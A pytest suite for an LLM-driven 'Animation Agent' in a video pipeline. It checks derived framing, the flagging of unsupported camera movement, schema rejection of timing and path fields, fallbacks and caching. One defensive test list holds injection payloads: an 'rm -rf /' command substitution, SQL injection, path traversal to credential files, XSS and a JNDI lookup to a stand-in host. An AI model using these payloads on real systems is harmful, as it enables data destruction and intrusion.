"""
Animation Agent.

The LLM is injected throughout - no test needs a key or a network. The
properties most of these defend:

  * the vocabulary is what `fit_filter` ACTUALLY implements, and a parity test
    fails loudly if the renderer's treatments ever change
  * `treatment` is derived from orientation, `clip_id` from the beat - neither
    is read from the reply
  * a request for movement is recorded as a gap, never promised, because this
    renderer has no zoom, pan or Ken Burns of any kind
  * with no model, only framing is stated and nothing is judged
"""

import json

import pytest
from pydantic import ValidationError

from agents.animation import AnimationAgent, _capabilities
from agents.artifacts import (Animation, AnimationDirection, ClipPriority,
                              ContentStrategy, Hook, KeyPoint, Story,
                              StoryBeat, VisionAnalysis, VisionClip)
from agents.tools.llm_tools import LLMClient, LLMReply

CALM, LIVELY = "01_calm.mp4", "02_lively.mp4"


# ------------------------------------------------------------- helpers

def anim_llm(payload, record=None):
    def transport(prompt, max_tokens, images=None):
        if record is not None:
            record.append(prompt)
        text = payload if isinstance(payload, str) else json.dumps(payload)
        return LLMReply(text=text, tokens_in=350, tokens_out=250, usd=0.003)
    return LLMClient(transport=transport)


def failing_llm(error="ConnectionError: refused"):
    def transport(prompt, max_tokens, images=None):
        return LLMReply(text="", error=error)
    return LLMClient(transport=transport)


def a_story(live=True, beats=True):
    bs = [
        StoryBeat(index=1, role="hook", clip_id=LIVELY,
                  narrative="it is already moving"),
        StoryBeat(index=2, role="develop", clip_id=CALM,
                  narrative="how the gears mesh"),
    ] if beats else []
    return Story(domain="model engineering", story_type="reasoned",
                 logline="a gear train built and then run", beats=bs,
                 insufficient_signal=False, confidence=0.8, live=live)


def a_strategy(insufficient=False):
    return ContentStrategy(
        domain="model engineering", strategy_type="reasoned",
        central_topic="a working gear train", core_angle="simpler than it looks",
        audience="people who build mechanisms", pacing="fast",
        hook=Hook(clip_id=LIVELY),
        key_points=[KeyPoint(point="it turns", support="vision",
                             clip_ids=[LIVELY])],
        clip_priorities=[ClipPriority(clip_id=LIVELY, priority=1)],
        insufficient_signal=insufficient, confidence=0.8, live=True)


def a_vision(analysed=True):
    return VisionAnalysis(
        domain="model engineering", provider="injected", live=True,
        clips={c: VisionClip(clip_id=c, analysed=analysed,
                             summary=f"{c} shows the mechanism",
                             subjects=["a gear train"], visual_quality=70.0)
               for c in (CALM, LIVELY)})


GOOD = {
    "visual_style": "close and mechanical, let the parts read clearly",
    "pacing_feel": "steady, never frantic",
    "directions": [
        {"beat_index": 1, "emphasis": "subject",
         "caption_intent": "short_label", "intent": "the moving part leads"},
        {"beat_index": 2, "emphasis": "context",
         "caption_intent": "none", "intent": "show how it fits together"},
    ],
    "unsupported_requests": [],
    "risks": ["could read as a parts catalogue"],
    "limitations": ["only two beats"],
    "confidence": 0.8,
}


def run(ctx, tracer_span, clip_set=None, story=None, strategy=None,
        vision=None, revision=0):
    agent = AnimationAgent()
    with tracer_span(ctx, "animation") as span:
        return agent.execute(ctx, span, clip_set=clip_set, story=story,
                             strategy=strategy, vision=vision,
                             revision=revision)


@pytest.fixture
def anim_ctx(director_ctx):
    ctx, clip_set = director_ctx
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(
            update={"domain": "model engineering"})})
    return ctx, clip_set


# --------------------- 1. parity with the real render engine

def test_the_capabilities_are_read_from_the_real_fit_filter():
    """If fit_filter changes shape, this must notice rather than lie."""
    import inspect

    from agents.tools.pipeline_bridge import build_video

    src = inspect.getsource(build_video.fit_filter)
    caps = _capabilities()
    assert caps, "the renderer reported no treatments at all"
    # the two framing branches fit_filter really has
    assert "force_original_aspect_ratio=increase" in src
    assert "gblur" in src
    assert any(c.startswith("fill:") for c in caps)
    assert any(c.startswith("blur_pad:") for c in caps)
    assert any(c.startswith("caption:") for c in caps)


def test_the_renderer_really_has_no_motion_capability():
    """The whole design rests on this: there is no zoom/pan anywhere."""
    import inspect

    from agents.tools.pipeline_bridge import build_video

    whole = inspect.getsource(build_video)
    assert "zoompan" not in whole, \
        "the renderer grew motion - Animation should now be able to direct it"


def test_capabilities_reach_the_artifact_and_are_not_model_output(anim_ctx,
                                                                  tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "engine_capabilities": ["teleportation"]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.engine_capabilities == _capabilities()
    assert "teleportation" not in p.engine_capabilities


def test_the_prompt_states_what_the_renderer_cannot_do(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    seen = []
    ctx.llm = anim_llm(GOOD, record=seen)
    run(ctx, tracer_span, clip_set, a_story())
    assert "NO zoom" in seen[0]
    assert "Do not ask for movement" in seen[0]
    for cap in _capabilities():
        assert cap.split(":")[0] in seen[0]


# ------------------------------------------ 2. a valid direction

def test_a_valid_reply_becomes_a_complete_direction(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_story(), a_strategy(), a_vision())
    p = art.payload

    assert isinstance(p, Animation)
    assert p.animation_type == "reasoned"
    assert p.visual_style and p.pacing_feel
    assert len(p.directions) == 2
    assert p.directions[0].emphasis == "subject"
    assert p.directions[0].caption_intent == "short_label"
    assert p.captioned_beats == [1]
    assert p.live is True
    assert not p.insufficient_signal
    assert art.degraded is False and art.fallback_used is None


def test_the_envelope_is_complete(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_story(), a_strategy())
    assert art.artifact_id and art.job_id == ctx.job.job_id
    assert art.kind == "Animation"
    assert art.schema_version >= 1 and art.revision == 0
    assert art.produced_by == "animation"
    assert art.produced_at > 0 and art.inputs_hash and art.trace_id
    assert 0.0 <= art.confidence <= 1.0
    assert art.cost is not None


# ------------------------------- 3. grounding / derived values

def test_the_treatment_is_derived_from_orientation(anim_ctx, tracer_span):
    """The same comparison fit_filter makes, made here."""
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "directions": [
        {"beat_index": 1, "treatment": "blur_pad"}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload

    cw, ch = clip_set.canvas
    canvas_orientation = "vertical" if ch > cw else "horizontal"
    clip = clip_set.by_id(LIVELY)
    expected = ("fill" if clip.technical.orientation == canvas_orientation
                else "blur_pad")
    assert p.directions[0].treatment == expected


def test_a_mismatched_orientation_gets_blur_pad(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    # flip one clip to the opposite orientation of the canvas
    flipped = clip_set.model_copy(update={"clips": [
        c.model_copy(update={"technical": c.technical.model_copy(
            update={"orientation": "vertical"})})
        if c.clip_id == LIVELY else c
        for c in clip_set.clips]})
    ctx.llm = anim_llm(GOOD)
    p = run(ctx, tracer_span, flipped, a_story()).payload
    by_beat = {d.beat_index: d.treatment for d in p.directions}
    assert by_beat[1] == "blur_pad", "vertical clip on a horizontal canvas"
    assert by_beat[2] == "fill"


def test_the_clip_comes_from_the_beat_not_the_reply(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "directions": [
        {"beat_index": 1, "clip_id": "99_invented.mp4"}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.directions[0].clip_id == LIVELY


@pytest.mark.parametrize("bi", [99, 0, -1, "1", 1.5, True, None, {"a": 1}])
def test_a_direction_on_a_nonexistent_beat_is_dropped(anim_ctx, tracer_span,
                                                      bi):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "directions": [
        {"beat_index": bi, "emphasis": "subject"},
        {"beat_index": 2, "emphasis": "context"}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert [d.beat_index for d in p.directions] == [2]
    assert any("does not exist" in x for x in p.limitations)


def test_a_duplicate_direction_is_dropped(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "directions": [
        {"beat_index": 1, "emphasis": "subject"},
        {"beat_index": 1, "emphasis": "text"}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert [d.beat_index for d in p.directions] == [1]
    assert p.directions[0].emphasis == "subject"
    assert any("duplicate" in x for x in p.limitations)


def test_directions_are_ordered_by_beat(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "directions": [
        {"beat_index": 2, "emphasis": "context"},
        {"beat_index": 1, "emphasis": "subject"}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert [d.beat_index for d in p.directions] == [1, 2]
    assert [d.index for d in p.directions] == [1, 2]


# ------------------------------- 4. movement is never promised

@pytest.mark.parametrize("wish", [
    "slow zoom in on the gear", "pan across the build", "a Ken Burns push",
    "parallax on the background", "rotate around the mechanism",
    "a quick whip pan", "dolly towards the subject",
])
def test_a_direction_asking_for_movement_is_marked_unsupported(anim_ctx,
                                                               tracer_span,
                                                               wish):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "directions": [
        {"beat_index": 1, "emphasis": "subject", "intent": wish}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.directions[0].supported is False
    assert p.supported_directions == []
    assert any("cannot perform" in x or "movement" in x
               for x in p.limitations)


def test_movement_in_the_overall_style_is_recorded_as_a_gap(anim_ctx,
                                                            tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD,
                        "visual_style": "constant slow zoom throughout"})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.unsupported_requests
    assert any("cannot perform" in x for x in p.unsupported_requests)


def test_an_unsupported_request_is_kept_not_silently_dropped(anim_ctx,
                                                             tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD,
                        "unsupported_requests": ["a 3D exploded view"]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert "a 3D exploded view" in p.unsupported_requests
    assert any("will not happen" in x for x in p.limitations)


def test_a_supported_direction_stays_supported(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "directions": [
        {"beat_index": 1, "emphasis": "subject",
         "intent": "hold steady on the mechanism"}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.directions[0].supported is True
    assert len(p.supported_directions) == 1


# ------------------- 5. timestamp / duration / path rejection

def test_the_schema_makes_timing_and_paths_impossible():
    for bad in ({"start": 1.0}, {"end": 2.0}, {"duration": 3.0},
                {"at": 4.0}, {"seconds": 5}, {"zoom": 1.2},
                {"filter": "crop=1:1"}, {"path": "x.png"},
                {"ffmpeg": "-vf x"}, {"x": 10}, {"y": 20}):
        with pytest.raises(ValidationError):
            AnimationDirection(index=1, beat_index=1, clip_id="a", **bad)
    for bad in ({"total_duration": 30.0}, {"asset": "overlay.png"},
                {"filtergraph": "x"}, {"font": "arial.ttf"}):
        with pytest.raises(ValidationError):
            Animation(**bad)


def test_no_field_can_hold_a_time_or_a_path():
    banned = {"start", "end", "duration", "at", "seconds", "offset",
              "total_duration", "path", "file_path", "asset", "asset_path",
              "filter", "filtergraph", "ffmpeg", "font", "zoom", "x", "y"}
    for model in (Animation, AnimationDirection):
        assert not (set(model.model_fields) & banned), model.__name__


def test_a_model_sending_render_values_is_ignored(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "total_duration": 30.0,
                        "directions": [{"beat_index": 1, "zoom": 1.5,
                                        "start": 0.0, "duration": 9.5,
                                        "filter": "crop=1:1"}]})
    art = run(ctx, tracer_span, clip_set, a_story())
    dumped = json.dumps(art.payload.model_dump())
    assert "9.5" not in dumped and "1.5" not in dumped
    assert '"zoom"' not in dumped and '"filter"' not in dumped
    assert len(art.payload.directions) == 1


def test_direction_indices_must_be_contiguous():
    with pytest.raises(ValidationError):
        Animation(directions=[
            AnimationDirection(index=1, beat_index=1, clip_id="a"),
            AnimationDirection(index=3, beat_index=2, clip_id="b")])


# ------------------------------------ 6. malformed / invalid

@pytest.mark.parametrize("junk", ["not json", "", "[1,2,3]", '{"visual_style": '])
def test_malformed_replies_fall_back(anim_ctx, tracer_span, junk):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(junk)
    art = run(ctx, tracer_span, clip_set, a_story())
    assert art.degraded is True
    assert art.fallback_used and "deterministic" in art.fallback_used
    assert isinstance(art.payload, Animation)


def test_a_failed_call_falls_back(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = failing_llm()
    art = run(ctx, tracer_span, clip_set, a_story())
    assert art.degraded is True and art.payload.live is False


def test_junk_types_are_survived(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({"visual_style": True, "pacing_feel": {"a": 1},
                        "directions": "not a list",
                        "unsupported_requests": 5, "risks": None,
                        "limitations": {"a": 1}, "confidence": "high"})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.visual_style == "", "a bool must not become text"
    assert p.pacing_feel == ""
    assert p.directions == [] and p.unsupported_requests == []
    assert p.confidence == 0.0


@pytest.mark.parametrize("bad", ["hero", "SUBJECT", "", None, 7])
def test_an_invalid_emphasis_falls_back_to_none(anim_ctx, tracer_span, bad):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "directions": [
        {"beat_index": 1, "emphasis": bad, "caption_intent": bad}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.directions[0].emphasis == "none"
    assert p.directions[0].caption_intent == "none"


@pytest.mark.parametrize("bad", [5.0, -3, float("nan"), float("inf"), "x",
                                 None])
def test_confidence_is_always_in_range(anim_ctx, tracer_span, bad):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "confidence": bad})
    art = run(ctx, tracer_span, clip_set, a_story())
    assert 0.0 <= art.payload.confidence <= 1.0
    assert 0.0 <= art.confidence <= 1.0


def test_lists_and_directions_are_bounded(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    huge = "A" * 5000
    ctx.llm = anim_llm({**GOOD, "visual_style": huge,
                        "unsupported_requests": [huge] * 50,
                        "directions": [{"beat_index": 1}] * 200})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert len(p.visual_style) <= 300
    assert len(p.unsupported_requests) <= 8
    assert len(p.directions) <= 12


MALICIOUS = [
    "$(rm -rf /)", "; DROP TABLE artifacts; --", "../../../../etc/passwd",
    "C:\\Windows\\System32\\cmd.exe", "crop=in_w:in_h:0:0,scale=-1:720",
    "' OR '1'='1", "<script>alert(1)</script>", "file:///etc/shadow",
    "\x00truncated", "${jndi:ldap://evil.test/x}",
]


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_string_stays_inert_data(anim_ctx, tracer_span, payload):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "visual_style": payload,
                        "directions": [{"beat_index": 1, "intent": payload}]})
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert isinstance(p.visual_style, str)
    again = Animation.model_validate_json(p.model_dump_json())
    assert isinstance(again.visual_style, str)
    assert again.directions[0].clip_id == LIVELY
    assert again.directions[0].treatment in ("fill", "blur_pad")


# ------------------------------------------ 7. fallback behaviour

def test_with_no_api_key_only_framing_is_stated(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = LLMClient()
    assert not ctx.llm.available()

    art = run(ctx, tracer_span, clip_set, a_story(), a_strategy())
    p = art.payload

    assert art.degraded is True
    assert art.fallback_used and "deterministic" in art.fallback_used
    assert p.live is False and p.model is None
    assert p.directions, "the framing must still be stated"
    assert all(d.treatment in ("fill", "blur_pad") for d in p.directions)
    assert p.confidence == 0.0
    assert p.insufficient_signal is True


def test_the_fallback_judges_nothing(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.visual_style == "", "a fallback must not invent a look"
    assert p.pacing_feel == ""
    assert all(d.emphasis == "none" for d in p.directions)
    assert all(d.caption_intent == "none" for d in p.directions)
    assert all(d.intent == "" for d in p.directions)
    assert p.captioned_beats == []


def test_the_fallback_framing_matches_what_the_renderer_will_do(anim_ctx,
                                                                tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    cw, ch = clip_set.canvas
    canvas_orientation = "vertical" if ch > cw else "horizontal"
    for d in p.directions:
        clip = clip_set.by_id(d.clip_id)
        expected = ("fill" if clip.technical.orientation == canvas_orientation
                    else "blur_pad")
        assert d.treatment == expected


def test_the_fallback_names_no_asset(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, a_story()).payload
    assert p.unsupported_requests == []
    # there is simply nowhere for an asset to be expressed
    assert "asset" not in Animation.model_fields
    assert "asset" not in AnimationDirection.model_fields


def test_no_story_produces_a_minimal_direction(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, None)
    assert art.payload.directions == []
    assert art.payload.story_available is False
    assert art.payload.confidence <= 0.3
    assert any("no story with beats" in x for x in art.payload.limitations)


def test_no_vision_caps_confidence_and_is_stated(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "confidence": 1.0})
    p = run(ctx, tracer_span, clip_set, a_story(), a_strategy(), None).payload
    assert p.vision_available is False
    assert p.confidence <= 0.6
    assert any("not informed by what is actually in frame" in x
               for x in p.limitations)


def test_no_clip_set_still_yields_a_valid_treatment(anim_ctx, tracer_span):
    ctx, _clip_set = anim_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, None, a_story()).payload
    assert all(d.treatment in ("fill", "blur_pad") for d in p.directions)


# ---------------------------------------------- 8. cache behaviour

def test_identical_inputs_hit_the_cache(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    calls = []
    ctx.llm = anim_llm(GOOD, record=calls)
    st, cs, v = a_story(), a_strategy(), a_vision()
    first = run(ctx, tracer_span, clip_set, st, cs, v, revision=0)
    second = run(ctx, tracer_span, clip_set, st, cs, v, revision=1)
    assert second.artifact_id == first.artifact_id
    assert second.revision == 0
    assert len(calls) == 1


def test_the_cache_invalidates_when_the_story_changes(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    calls = []
    ctx.llm = anim_llm(GOOD, record=calls)
    first = run(ctx, tracer_span, clip_set, a_story(), revision=0)
    changed = a_story().model_copy(update={"logline": "a different story"})
    second = run(ctx, tracer_span, clip_set, changed, revision=1)
    assert second.inputs_hash != first.inputs_hash
    assert len(calls) == 2


def test_the_cache_invalidates_when_the_strategy_changes(anim_ctx,
                                                         tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(GOOD)
    st = a_story()
    first = run(ctx, tracer_span, clip_set, st, a_strategy(), revision=0)
    changed = a_strategy().model_copy(update={"pacing": "slow"})
    second = run(ctx, tracer_span, clip_set, st, changed, revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_invalidates_when_vision_changes(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(GOOD)
    st = a_story()
    first = run(ctx, tracer_span, clip_set, st, None, a_vision(), revision=0)
    changed = a_vision()
    changed = changed.model_copy(update={"clips": {
        c: vc.model_copy(update={"summary": "something else"})
        for c, vc in changed.clips.items()}})
    second = run(ctx, tracer_span, clip_set, st, None, changed, revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_invalidates_when_the_canvas_changes(anim_ctx, tracer_span):
    """Orientation against the canvas decides every treatment."""
    ctx, clip_set = anim_ctx
    ctx.llm = LLMClient()
    first = run(ctx, tracer_span, clip_set, a_story(), revision=0)
    vertical = clip_set.model_copy(update={"canvas": (1080, 1920)})
    second = run(ctx, tracer_span, vertical, a_story(), revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_is_not_time_based(anim_ctx, tracer_span):
    import time as _t
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(GOOD)
    agent = AnimationAgent()
    st = a_story()
    with tracer_span(ctx, "animation") as span:
        a = agent.execute(ctx, span, clip_set=clip_set, story=st, revision=0)
    _t.sleep(1.1)
    with tracer_span(ctx, "animation") as span:
        b = agent.execute(ctx, span, clip_set=clip_set, story=st, revision=1)
    assert a.inputs_hash == b.inputs_hash


# --------------------------------------- 9. trace + decisions

def test_the_trace_id_reaches_the_artifact(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(GOOD)
    agent = AnimationAgent()
    with tracer_span(ctx, "animation") as span:
        art = agent.execute(ctx, span, clip_set=clip_set, story=a_story())
        assert art.trace_id == span.trace_id
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "animation"]
    assert rows and art.artifact_id in rows[-1]["output_artifacts"]


def test_the_llm_call_is_recorded_in_the_trace(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(GOOD)
    run(ctx, tracer_span, clip_set, a_story())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "animation"]
    tools = [t["tool"] for r in rows for t in r["tool_calls"]]
    assert "llm.complete_json" in tools
    assert rows[-1]["tokens_in"] == 350 and rows[-1]["tokens_out"] == 250


def test_the_fallback_is_recorded_in_the_trace(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = LLMClient()
    run(ctx, tracer_span, clip_set, a_story())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "animation"]
    assert rows[-1]["fallback_used"]


def test_decisions_use_the_existing_closed_enum(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_story(), a_strategy(), a_vision())
    assert art.decisions
    allowed = {"llm", "measurement", "policy", "human", "fallback"}
    for d in art.decisions:
        assert d.what and d.chose and d.why
        assert d.decided_by in allowed, "the closed enum must not be widened"
        assert 0.0 <= d.confidence <= 1.0
    whats = {d.what for d in art.decisions}
    assert "Evidence the visual direction was built from" in whats
    assert "What the renderer can do" in whats
    assert "Framing per beat" in whats


def test_framing_is_attributed_to_measurement(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_story())
    d = next(d for d in art.decisions if d.what == "Framing per beat")
    assert d.decided_by == "measurement", "a derived value is not a choice"


def test_emphasis_is_attributed_to_the_model(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_story())
    d = next(d for d in art.decisions if d.what == "Emphasis per beat")
    assert d.decided_by == "llm"


def test_the_fallback_attributes_nothing_to_an_llm(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = LLMClient()
    art = run(ctx, tracer_span, clip_set, a_story())
    kinds = {d.decided_by for d in art.decisions}
    assert "fallback" in kinds
    assert "llm" not in kinds


def test_an_unsupported_request_is_a_policy_decision(anim_ctx, tracer_span):
    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm({**GOOD, "unsupported_requests": ["a 3D flythrough"]})
    art = run(ctx, tracer_span, clip_set, a_story())
    d = next(d for d in art.decisions if d.what == "Asked for but not possible")
    assert d.decided_by == "policy"
    assert "rather than promised" in d.why


# ------------------------- 10. the look reaches the edit

def test_the_director_receives_the_look(anim_ctx, tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = anim_ctx
    ctx.llm = anim_llm(GOOD)
    anim = run(ctx, tracer_span, clip_set, a_story(), a_strategy()).payload

    seen = []
    ctx.llm = anim_llm({"strategy": "s", "opening_rationale": "r",
                        "segments": [{"clip_id": LIVELY,
                                      "target_seconds": 4.0, "reason": "x"}],
                        "rejected": []}, record=seen)
    with tracer_span(ctx, "editing_director") as span:
        EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                       animation=anim, revision=0)

    prompt = seen[0]
    assert "THE LOOK" in prompt
    assert "emphasis: subject" in prompt
    assert "not a duration" in prompt
    assert "You do NOT choose timestamps" in prompt


def test_a_changed_look_invalidates_the_edit_plan_cache(anim_ctx,
                                                        tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = anim_ctx
    ctx.llm = LLMClient()
    agent = EditingDirectorAgent()
    one = Animation(directions=[AnimationDirection(
        index=1, beat_index=1, clip_id=LIVELY, emphasis="subject")])
    two = Animation(directions=[AnimationDirection(
        index=1, beat_index=1, clip_id=LIVELY, emphasis="text")])
    with tracer_span(ctx, "editing_director") as span:
        a = agent.execute(ctx, span, clip_set=clip_set, animation=one,
                          revision=0)
    with tracer_span(ctx, "editing_director") as span:
        b = agent.execute(ctx, span, clip_set=clip_set, animation=two,
                          revision=1)
    assert a.inputs_hash != b.inputs_hash


def test_the_director_records_that_it_acted_on_a_look(anim_ctx, tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = anim_ctx
    ctx.llm = LLMClient()
    anim = Animation(live=True, confidence=0.8, directions=[
        AnimationDirection(index=1, beat_index=1, clip_id=LIVELY,
                           treatment="fill", emphasis="subject",
                           caption_intent="short_label")])
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             animation=anim, revision=0)
    d = next(d for d in art.decisions
             if d.what == "Look brief from the Animation agent")
    assert "fill" in d.chose
    assert "want text" in d.chose
    assert d.decided_by == "policy"


def test_the_director_works_with_no_look(anim_ctx, tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = anim_ctx
    ctx.llm = LLMClient()
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             animation=None, revision=0)
    assert art.payload.segments
    assert not any(d.what == "Look brief from the Animation agent"
                   for d in art.decisions)


# ------------------------------------------ helpers on the model

def test_direction_helpers():
    a = Animation(directions=[
        AnimationDirection(index=1, beat_index=1, clip_id="a",
                           treatment="fill", caption_intent="short_label"),
        AnimationDirection(index=2, beat_index=2, clip_id="b",
                           treatment="blur_pad", supported=False)])
    assert a.treatments == ["fill", "blur_pad"]
    assert a.captioned_beats == [1]
    assert [d.beat_index for d in a.supported_directions] == [1]
    assert a.direction_for(2).treatment == "blur_pad"
    assert a.direction_for(9) is None
